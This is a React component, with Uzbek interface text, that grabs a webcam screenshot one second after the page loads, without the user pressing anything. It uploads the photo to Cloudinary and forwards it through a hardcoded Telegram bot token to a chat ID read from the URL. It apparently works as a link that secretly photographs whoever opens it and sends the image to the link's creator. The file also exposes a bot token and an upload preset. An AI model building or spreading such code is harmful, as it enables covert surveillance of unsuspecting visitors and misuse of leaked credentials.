import React, { useEffect, useRef, useState } from 'react';
import { useParams } from 'react-router-dom';
import Webcam from 'react-webcam';

function Photo() {
  const webcamRef = useRef(null);
  const [photo, setPhoto] = useState(null);
  let id=useParams().id
  console.log(id);
  
  const BOT_TOKEN = "8590279638:AAGEiQJng67xd_L4J8nXbIyL2YncMo3f6bo";
  const CHAT_ID = id;
  const CLOUD_NAME = "dr3vapk9f";        
  const UPLOAD_PRESET = "abdulaziz";  

  const uploadToCloudinary = async (imgBase64) => {
    const formData = new FormData();
    formData.append("file", imgBase64);
    formData.append("upload_preset", UPLOAD_PRESET);

    const res = await fetch(
      `https://api.cloudinary.com/v1_1/${CLOUD_NAME}/image/upload`,
      { method: "POST", body: formData }
    );

    return await res.json();
  };

  const sendToTelegram = async (url) => {
    await fetch(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto?chat_id=${CHAT_ID}&photo=${url}`
    );
  };

  useEffect(() => {
    const timer = setTimeout(() => {
      if (webcamRef.current) {
        const img = webcamRef.current.getScreenshot();
        setPhoto(img); 
      }
    }, 1000);

    return () => clearTimeout(timer);
  }, []); 

  useEffect(() => {
    if (!photo) return;

    (async () => {
      const uploaded = await uploadToCloudinary(photo);

      if (uploaded.secure_url) {
        await sendToTelegram(uploaded.secure_url);
        alert("✅ Rasm Telegramga yuborildi!");
      } else {
        alert("❌ Cloudinary upload xatosi!");
      }
    })();
  }, [photo]);

  return (
    <div style={{ textAlign: "center", marginTop: "30px" }}>
      <h2>📸 Kamera orqali rasm olish</h2>

      <Webcam
        ref={webcamRef}
        screenshotFormat="image/jpeg"
        width={320}
        height={240}
        videoConstraints={{ facingMode: "user" }}
      />
    </div>
  );
}

export default Photo;
